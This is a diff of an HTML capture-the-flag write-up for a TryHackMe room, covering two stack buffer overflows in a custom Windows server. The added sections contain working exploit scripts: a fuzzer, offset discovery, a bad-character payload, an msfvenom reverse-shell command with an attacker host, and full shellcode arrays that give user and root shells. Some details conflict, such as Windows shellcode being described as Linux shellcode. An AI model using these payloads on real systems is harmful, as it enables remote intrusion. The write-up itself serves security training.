@@ -13,7 +13,7 @@
 
   <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
   <h1>Dawn2: a classic stack buffer overflow, twice</h1>
-  <p class="dek">A custom Windows server, leaked straight off its own web page, turns out to be vulnerable to a textbook stack-based buffer overflow. The target runs two separate instances of it, one for a user shell, a second running as root for the rest.</p>
+  <p class="dek">A custom Windows server, leaked straight off its own web page, turns out to be vulnerable to a textbook stack-based buffer overflow. The target runs two separate instances of it, one for a user shell, a second running as root.</p>
 
   <div class="meta-row">
     <span class="pill">Room: Dawn2</span>
@@ -40,20 +40,35 @@
   </section>
 
   <section>
-    <h2 class="section-title">Part One: User Shell</h2>
+    <h2 class="section-title">Part One: User Shell (port 1985)</h2>
     <div class="steps">
 
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Find the target binary and confirm the crash</div>
-          <p>The web server's default page links directly to a zip containing the custom server binary and a README warning that the service "may crash after several requests," a strong hint before any fuzzing even starts. Confirming the file type:</p>
-          <pre><code>file dawn.exe
+          <div class="step-title">Enumerate the target and grab its own binary</div>
+          <pre><code>nmap -sCV -v -T4 -p- &lt;IP&gt; --open
+
+PORT     STATE SERVICE   VERSION
+80/tcp   open  http      Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+1435/tcp open  ibm-cics?
+1985/tcp open  hsrp?</code></pre>
+          <p>Port 80's default page links directly to <code>http://&lt;target&gt;/dawn.zip</code>. Unzipped, it contains <code>dawn.exe</code> and a README that hands over the exact fuzzing requirement before any testing even starts:</p>
+          <pre><code>DAWN Multi Server - Version 1.1
+
+Important:
+
+Due the lack of implementation of the Dawn client, many issues may be
+experienced, such as the message not being delivered. In order to make
+sure the connection is finished and the message well received, send a
+NULL-byte at the ending of your message. Also, the service may crash
+after several requests.</code></pre>
+          <pre><code>$ file dawn.exe
 dawn.exe: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
-          <p>With the binary loaded in Immunity Debugger on a Windows VM, sending 500 bytes of <code>A</code> followed by a null byte (per the README's own instructions) overwrites EIP with <code>41414141</code>, confirming the crash is controllable.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A target that hands you its own binary, and even a note about how it fails, is doing half the reconnaissance for you. Reading the README literally (send a null byte to terminate the message) turned out to be load-bearing for triggering the crash at all.</p>
+            <p>A target that hands over its own binary, and a note about exactly how to terminate a message, is doing half the reconnaissance for you. The null-byte requirement turns out to be load-bearing for the exploit itself, not just the protocol.</p>
           </div>
         </div>
       </div>
@@ -61,13 +76,30 @@ dawn.exe: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Find the exact offset</div>
-          <p>A unique, non-repeating 500-byte pattern (generated with <code>msf-pattern_create</code>) replaces the plain A's. Whatever four bytes land in EIP at crash time pinpoint the exact offset into the buffer:</p>
-          <pre><code>msf-pattern_offset -q &lt;4-bytes-from-EIP&gt;
-[*] Exact match at offset 272</code></pre>
+          <div class="step-title">Confirm the crash</div>
+          <p>With <code>dawn.exe</code> running under Immunity Debugger on a Windows VM, 500 bytes of <code>A</code> plus the required null byte:</p>
+          <pre><code>#!/usr/bin/python3
+import socket,os,sys
+server = "10.0.2.40"
+port = 1985
+
+As = b'A'
+nullbyte = b'\x00'
+payload = As * 500 + nullbyte
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(payload)
+    s.close()
+    print("[+] payload sent.")
+
+if __name__ == "__main__":
+    main()</code></pre>
+          <p>EIP gets overwritten with <code>41414141</code>, the hex for 500 A's. Crash confirmed and controllable.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A repeating pattern like all-A's can't tell you where in the buffer the crash happened, every chunk looks the same. A non-repeating pattern makes every 4-byte window unique, so whatever ends up in EIP maps back to one exact position.</p>
+            <p>EIP landing on a value that's recognizably "all A's" proves the overflow reaches exactly the saved return address, not some other part of the stack.</p>
           </div>
         </div>
       </div>
@@ -75,12 +107,16 @@ dawn.exe: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Confirm control and check for space</div>
-          <p>Sending the offset in A's, four B's, then a null byte confirms EIP lands exactly on <code>42424242</code>. Following that with 400 C's (the rough size budget for a reverse-shell payload) confirms there's room in the buffer for real shellcode without corrupting anything:</p>
-          <pre><code>payload = A*offset + B*4 + C*400 + nullbyte</code></pre>
+          <div class="step-title">Find the exact offset</div>
+          <p>A unique, non-repeating pattern replaces the plain A's, so whatever ends up in EIP maps back to one exact byte position:</p>
+          <pre><code>$ msf-pattern_create -l 500
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4...</code></pre>
+          <p>Sending that pattern the same way as before, EIP comes back as <code>316A4130</code>:</p>
+          <pre><code>$ msf-pattern_offset -q 316a4130
+[*] Exact match at offset 272</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Controlling EIP is necessary but not sufficient, the payload also has to fit. Confirming space for it before writing real shellcode avoids discovering a buffer-size problem after everything else is already working.</p>
+            <p>A repeating pattern can't tell you where the crash happened, every chunk looks the same. A non-repeating pattern makes every 4-byte window unique, so the exact bytes in EIP map to exactly one position in the buffer.</p>
           </div>
         </div>
       </div>
@@ -88,11 +124,14 @@ dawn.exe: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">Rule out bad characters</div>
-          <p>Certain byte values (null bytes, line feeds, carriage returns) get mangled by string-handling code before they ever reach the buffer intact. Sending every possible byte value from <code>\x01</code> to <code>\xff</code> and comparing what Immunity Debugger shows in memory against what was actually sent identifies which, if any, get corrupted in transit.</p>
+          <div class="step-title">Confirm control and check for room</div>
+          <p>272 A's, then four B's, then a null byte confirms EIP lands exactly on <code>42424242</code>:</p>
+          <pre><code>payload = As * 272 + (b'B' * 4) + nullbyte</code></pre>
+          <p>Following that with 400 C's, the rough budget for a reverse-shell payload, confirms there's room in the buffer without corrupting anything:</p>
+          <pre><code>payload = As * 272 + (b'B' * 4) + (b'C' * 400) + nullbyte</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Shellcode generated without knowing the bad-character list can silently break the moment it includes one of them. Testing the full byte range up front means the final payload can be generated with exactly the right exclusion list from the start.</p>
+            <p>Controlling EIP is necessary but not sufficient, the payload also has to physically fit. Confirming space before writing real shellcode avoids discovering a size problem after everything else already works.</p>
           </div>
         </div>
       </div>
@@ -100,15 +139,55 @@ dawn.exe: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Find a jump point and weaponize it</div>
-          <p>Mona's built-in search finds a usable <code>jmp esp</code> instruction with no protections enabled:</p>
-          <pre><code>!mona jmp -r esp</code></pre>
-          <p>With the offset, a working jump address, and a confirmed bad-character list, <code>msfvenom</code> generates working shellcode matched to the target's architecture and OS:</p>
-          <pre><code>msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=&lt;attacker-ip&gt; LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode</code></pre>
-          <p>The final payload (offset padding, jump address, a NOP sled, the shellcode, then a null terminator) sent against the real target lands a reverse shell.</p>
+          <div class="step-title">Rule out bad characters</div>
+          <p>Every byte value from <code>\x01</code> to <code>\xff</code> gets sent as the payload body, then compared byte-for-byte against what Immunity Debugger shows actually landed in memory (right-click ESP &rarr; Follow Dump):</p>
+          <pre><code>badchars =b''
+badchars+=b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+badchars+=b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+... (continues through \xff)
+
+payload = As * 272 + (b'B' * 4) + badchars + nullbyte</code></pre>
+          <p>Every value from <code>\x01</code> through <code>\xff</code> lands intact and in order, no bad characters to exclude.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Every earlier step exists to answer one question this payload depends on: exactly how many bytes, which address to jump to, and which bytes to avoid. Skipping any of them turns this into blind guessing instead of a reliable exploit.</p>
+            <p>Certain byte values (nulls, line feeds, carriage returns) get mangled by string-handling code before they reach the buffer. Shellcode generated without knowing which ones can silently break the moment it includes one.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Find a jump point and weaponize it</div>
+          <p>Mona's search finds a usable <code>jmp esp</code> instruction with no protections enabled:</p>
+          <pre><code>!mona jmp -r esp</code></pre>
+          <p>The output gives a viable pointer at <code>0x345964ba</code>. With the offset, jump address, and a clean bad-character list, msfvenom generates the shellcode:</p>
+          <pre><code>msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.0.2.30 LPORT=4444 -f py -b '\x00' EXITFUNC=thread -v shellcode</code></pre>
+          <p>The final payload against the real target (272 A's, the jump address in little-endian, a 16-byte NOP sled, the shellcode, another NOP sled, then the null terminator):</p>
+          <pre><code>server = "192.168.55.12"   #target server
+port = 1985
+
+shellcode =  b""
+shellcode += b"\xb8\x0f\xe6\x73\xc6\xda\xc4\xd9\x74\x24\xf4"
+shellcode += b"\x5f\x2b\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e"
+shellcode += b"\x03\x48\xe8\x91\x33\x67\x2f\xa2\x5f\xd4\x8c"
+shellcode += b"\x1e\xca\xd8\x9b\x40\xba\xba\x56\x02\x28\x1b"
+shellcode += b"\xd9\x3c\x82\x1b\x50\x3a\xe5\x73\xa3\x14\x24"
+shellcode += b"\xb4\x4b\x67\x47\xab\xd7\xee\xa6\x7b\x81\xa0"
+shellcode += b"\x79\x28\xfd\x42\xf3\x2f\xcc\xc5\x51\xc7\xa1"
+shellcode += b"\xea\x26\x7f\x56\xda\xe7\x1d\xcf\xad\x1b\xb3"
+shellcode += b"\x5c\x27\x3a\x83\x68\xfa\x3d"
+
+As = b'A'
+offset = 272
+nullbyte = b'\x00'
+nops = b'\x90' * 16
+jmp_addr = b'\xba\x64\x59\x34'
+payload = As * offset + jmp_addr + nops + shellcode + nops + nullbyte</code></pre>
+          <p>Sent against the real Dawn target, this lands a reverse shell as a normal user.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>Every earlier step exists to pin down one variable this payload depends on: exactly how many bytes, which address to jump to, and which bytes to avoid. Skipping any of them turns this into blind guessing instead of a reliable exploit.</p>
           </div>
         </div>
       </div>
@@ -117,32 +196,73 @@ dawn.exe: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
   </section>
 
   <section>
-    <h2 class="section-title">Part Two: Root, via a Second Instance</h2>
+    <h2 class="section-title">Part Two: Root, via a Second Instance (port 1435)</h2>
     <div class="steps">
 
       <div class="step">
-        <div class="step-num">6</div>
+        <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Find the second server, running as root</div>
-          <p>A second binary, the same custom server software but a different build, sits on the target and listens on a different port entirely, this one running with root privileges.</p>
+          <div class="step-title">Find the second binary, running as root</div>
+          <p>A second executable, <code>dawn-BETA.exe</code>, sits on the target from the foothold shell. Same file family, confirmed the same way:</p>
+          <pre><code>$ file dawn-BETA.exe
+dawn-BETA.exe: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
+          <p>It listens on port 1435, the second port the original nmap scan already flagged, and runs with root privileges.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Gaining a foothold is rarely the end of enumeration, it's a reason to look harder. The same vulnerable software class, redeployed with higher privileges, is exactly the kind of thing a first shell makes visible that external scanning wouldn't.</p>
+            <p>Gaining a foothold is rarely the end of enumeration, it's a reason to look harder. The same vulnerable software class, redeployed with higher privileges, is exactly what a first shell makes visible that external scanning couldn't.</p>
           </div>
         </div>
       </div>
 
       <div class="step">
-        <div class="step-num">7</div>
+        <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Repeat the process against the new target</div>
-          <p>Same methodology, different numbers. The crash is confirmed the same way, and this time the offset comes out much shorter:</p>
-          <pre><code>msf-pattern_offset -q &lt;4-bytes-from-EIP&gt;
+          <div class="step-title">Repeat offset-finding against the new target</div>
+          <p>Same 500 A's against port 1435 confirms a crash, then the same unique pattern narrows it down. This time EIP comes back as <code>61413461</code>, decoding to the ASCII sequence <code>a4Aa</code>:</p>
+          <pre><code>$ msf-pattern_offset -q 61413461
 [*] Exact match at offset 13</code></pre>
-          <p>The bad-character test comes back clean against the same exclusion list as before, and a fresh <code>!mona jmp -r esp</code> search finds a valid jump address for this binary's own memory layout. The existing Linux reverse-shell shellcode, already generated for the target's architecture, gets reused directly.</p>
+          <p>A much shorter buffer than the first binary, 13 bytes instead of 272.</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>The same software, even a different build, tends to fail the same way. Running through the identical methodology (not guessing the new offset, not skipping the bad-char check) is what makes this repeatable rather than lucky, and it confirms the two binaries really are built from the same vulnerable code path with different buffer sizes.</p>
+            <p>The same software, even a different build, tends to fail the same way, but not necessarily with the same numbers. Re-running the full methodology instead of assuming the old offset still applies is what catches the buffer-size difference.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Confirm bad chars and find the new jump point</div>
+          <p>The same badchar payload from Part One, re-sent against port 1435, comes back clean again, same exclusion list applies. A fresh mona search against this binary's own memory layout:</p>
+          <pre><code>!mona jmp -r esp</code></pre>
+          <p>finds a valid <code>jmp esp</code> address for the BETA binary specifically (a different address than the first binary, since it's a separate build in memory).</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A jump address is tied to a specific binary's memory layout, it has to be re-found for every build, even one that's otherwise identical code.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">Reuse the Linux shellcode for root</div>
+          <p>Since this is the same target architecture and OS as before, the Linux reverse-shell shellcode from Part One's final exploit gets reused directly, just rebuilt around the new 13-byte offset and the BETA binary's own jump address:</p>
+          <pre><code>#dawn-BETA.exe linux PG target
+shellcode =  b""
+shellcode += b"\xb8\x18\x31\x0c\x19\xda\xce\xd9\x74\x24\xf4"
+shellcode += b"\x5b\x2b\xc9\xb1\x12\x31\x43\x12\x03\x43\x12"
+shellcode += b"\x83\xf3\xcd\xee\xec\x32\xf5\x18\xed\x67\x4a"
+shellcode += b"\xb4\x98\x85\xc5\xdb\xed\xef\x18\x9b\x9d\xb6"
+shellcode += b"\x12\xa3\x6c\xc8\x1a\xa5\x97\xa0\x5c\xfd\x59"
+shellcode += b"\x07\x35\xfc\x99\x76\x99\x89\x7b\xc8\x47\xda"
+shellcode += b"\x2a\x7b\x3b\xd9\x45\x9a\xf6\x5e\x07\x34\x67"
+shellcode += b"\x70\xdb\xac\x1f\xa1\x34\x4e\x89\x34\xa9\xdc"
+shellcode += b"\x1a\xce\xcf\x50\x97\x1d\x8f"</code></pre>
+          <p>Sent against port 1435 on the real target, this lands a reverse shell running as root.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>The exploit primitives (shellcode, NOP sled, null terminator) don't change between the two binaries, only the offset and the jump address do. Reusing what's already proven working minimizes the number of new variables introduced on the second pass.</p>
           </div>
         </div>
       </div>
@@ -152,18 +272,17 @@ dawn.exe: PE32 executable (console) Intel 80386, for MS Windows</code></pre>
 
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
-    <pre><code>Web server: companion binary leaked via a download link
+    <pre><code>Web server: companion binary leaked via a download link (dawn.exe, port 1985)
   &rarr; File type confirmed: 32-bit Windows PE
-       &rarr; Crash confirmed: 500 A's overwrite EIP
-            &rarr; Unique pattern: exact offset found
-                 &rarr; Space confirmed: room for a real payload
-                      &rarr; Bad chars ruled out
-                           &rarr; jmp esp found via mona
-                                &rarr; msfvenom shellcode: reverse shell as a normal user
+       &rarr; Crash confirmed: 500 A's overwrite EIP with 41414141
+            &rarr; Unique pattern: offset found at 272
+                 &rarr; Space confirmed, bad chars ruled out clean
+                      &rarr; jmp esp found via mona (0x345964ba)
+                           &rarr; msfvenom shellcode: reverse shell as a normal user
 
-Second server instance found, running as root
-  &rarr; Same methodology repeated: new offset, same bad chars, new jmp esp
-       &rarr; Shellcode reused: reverse shell as root</code></pre>
+Second binary found on the target (dawn-BETA.exe, port 1435, runs as root)
+  &rarr; Same methodology: offset found at 13, same bad chars, new jmp esp
+       &rarr; Linux shellcode reused: reverse shell as root</code></pre>
   </section>
 
   <section>
@@ -175,7 +294,7 @@ Second server instance found, running as root
       </div>
       <div class="skill">
         <div class="skill-title">The same vulnerable code, redeployed, is still vulnerable</div>
-        <p>Finding one instance of a flawed custom service is a strong reason to look for others. A second copy running with higher privileges turned a user shell into root using the identical technique.</p>
+        <p>Finding one instance of a flawed custom service is a strong reason to look for others. A second copy running with higher privileges turned a user shell into root using the identical technique, just with its own offset and jump address.</p>
       </div>
     </div>
   </section>
